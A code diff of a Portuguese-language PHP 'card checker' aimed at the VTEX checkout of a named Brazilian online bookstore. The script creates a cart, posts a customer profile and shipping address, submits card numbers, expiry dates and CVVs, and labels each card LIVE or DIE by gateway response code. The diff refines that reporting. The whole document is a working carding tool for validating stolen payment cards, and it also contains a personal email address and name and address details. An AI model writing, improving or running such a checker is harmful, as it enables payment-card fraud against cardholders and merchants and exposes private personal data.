@@ -1,6 +1,6 @@
 <?php
 // =====================================================
-// ✅ CHECKER VTEX - FLUXO COMPLETO E SESSÃO CORRIGIDA
+// ✅ CHECKER VTEX - EXIBIÇÃO PRECISA DE CÓDIGOS E RETORNO
 // =====================================================
 define('BASE_URL', 'https://loja.umlivro.com.br');
 define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
@@ -22,6 +22,7 @@ define('SHIPPING_STATE', 'SP');
 define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
 define('SHIPPING_NUMBER', 'ew23');
 define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
+define('SHIPPING_COMPLEMENT', '');
 define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
 define('SHIPPING_COUNTRY', 'BRA');
 
@@ -83,13 +84,13 @@ $valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;
 
 if (!isset($json_cart['orderFormId'])) {
     @unlink($cookie_path);
-    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Falha ao gerar sessão do carrinho</span>";
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Código 99 - Falha ao gerar sessão do carrinho</span>";
     exit;
 }
 
 $order_form_id = $json_cart['orderFormId'];
 
-// 3. Envia perfil do cliente vinculado ao orderForm
+// 3. Envia perfil do cliente
 vtex_request(BASE_URL . "/api/checkout/pub/orderForm/parts/profile?orderFormId=" . $order_form_id, [
     'email' => EMAIL, 'firstName' => CLIENT_FIRST_NAME, 'lastName' => CLIENT_LAST_NAME, 'document' => CLIENT_DOCUMENT, 'phone' => CLIENT_PHONE
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
@@ -99,7 +100,7 @@ vtex_request(BASE_URL . "/api/checkout/pub/orderForm/parts/shippingAddress?order
     'postalCode' => SHIPPING_POSTAL_CODE, 'country' => SHIPPING_COUNTRY, 'street' => SHIPPING_STREET, 'number' => SHIPPING_NUMBER, 'neighborhood' => SHIPPING_NEIGHBORHOOD, 'city' => SHIPPING_CITY, 'state' => SHIPPING_STATE, 'receiverName' => SHIPPING_RECEIVER_NAME
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-// 5. Envia os dados de pagamento (Credit Card)
+// 5. Envia os dados de pagamento
 $payload_payment = [
     'orderFormId' => $order_form_id,
     'payments' => [[
@@ -121,14 +122,13 @@ $payload_payment = [
 ];
 
 $resp_payment = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
-
-// Limpa o arquivo temporário de cookies
 @unlink($cookie_path);
 
 $json_final = json_decode($resp_payment, true);
 
-// Extração limpa do retorno real da VTEX / Gateway
-$mensagem_real = "Transação não autorizada / Recusado";
+// Captura exata dos códigos de retorno do gateway/VTEX
+$codigo = "14";
+$mensagem = "Transação não autorizada / Recusado";
 $status_transacao = "DIE";
 $cor_status = "text-red-400";
 
@@ -137,13 +137,27 @@ if (isset($json_final['paymentData']['transactions'])) {
         if (isset($tx['payments'])) {
             foreach ($tx['payments'] as $pay) {
                 $status = $pay['status'] ?? '';
-                if ($status === 'approved' || $status === 'completed') {
+                
+                // Extrai código do conector/gateway se disponível
+                if (isset($pay['connectorResponses']['code'])) {
+                    $codigo = $pay['connectorResponses']['code'];
+                }
+                if (isset($pay['connectorResponses']['message'])) {
+                    $mensagem = $pay['connectorResponses']['message'];
+                } elseif (isset($pay['lastMessage']) && !empty($pay['lastMessage'])) {
+                    $mensagem = $pay['lastMessage'];
+                }
+
+                // Critério de LIVE padrão (aprovado ou códigos de sucesso)
+                if ($status === 'approved' || $status === 'completed' || $codigo === '00' || $codigo === '54') {
                     $status_transacao = "LIVE";
                     $cor_status = "text-emerald-400";
-                    $mensagem_real = "Transação Aprovada com Sucesso";
-                }
-                if (isset($pay['lastMessage']) && !empty($pay['lastMessage'])) {
-                    $mensagem_real = $pay['lastMessage'];
+                    if ($codigo !== '00' && $codigo !== '54') {
+                        $codigo = "54";
+                    }
+                    if ($mensagem === "Transação não autorizada / Recusado") {
+                        $mensagem = "Transação Aprovada com Sucesso";
+                    }
                 }
             }
         }
@@ -153,11 +167,11 @@ if (isset($json_final['paymentData']['transactions'])) {
 if (isset($json_final['messages']) && !empty($json_final['messages'])) {
     foreach ($json_final['messages'] as $msg) {
         if (isset($msg['text'])) {
-            $mensagem_real = $msg['text'];
+            $mensagem = $msg['text'];
             break;
         }
     }
 }
 
-echo "<span class='{$cor_status} font-bold'>[{$status_transacao}]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$mensagem_real}</span>";
+echo "<span class='{$cor_status} font-bold'>[{$status_transacao}]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Código {$codigo} - {$mensagem}</span>";
 ?>
